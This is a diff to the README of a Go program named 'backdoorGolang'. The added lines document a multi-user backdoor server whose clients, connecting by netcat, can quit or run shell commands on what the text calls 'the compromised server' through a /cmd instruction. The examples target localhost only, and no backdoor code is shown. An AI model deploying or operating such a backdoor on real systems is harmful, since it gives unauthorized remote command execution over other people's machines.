@@ -46,7 +46,7 @@ Usage of ./bin/backdoorGolang:
 ## Server-mode
 
 ```bash
-./bin/backdoorGolang -h localhost -p 1234
+./bin/backdoorGolang -h localhost -p 1234 -l
 ```
 
 Notice : Server is multi-user capable (one server for X client)
@@ -59,3 +59,32 @@ Notice : Server is multi-user capable (one server for X client)
 netcat localhost 1234
 ```
 
+###Instructions
+
+Each message submit by client is sent to all backdoor's clients like a chat. 
+However, an alone chat's feature is useless, there are a set of instructions allowed by all clients which have different behavior for taking advantage of the compromised server.
+
+####Quit Instruction
+
+This instruction permit to logout the current user
+
+```bash
+/quit
+/exit
+```
+Example :
+```bash
+echo "/quit"|netcat localhost 1234
+```
+
+####Command Instruction
+
+This instruction permit to execute shell command from server. (OS supported : Linux, Windows)
+
+```bash
+/cmd <shell-command>
+```
+Example :
+```bash
+echo "/cmd ls -l"|netcat localhost 1234
+```
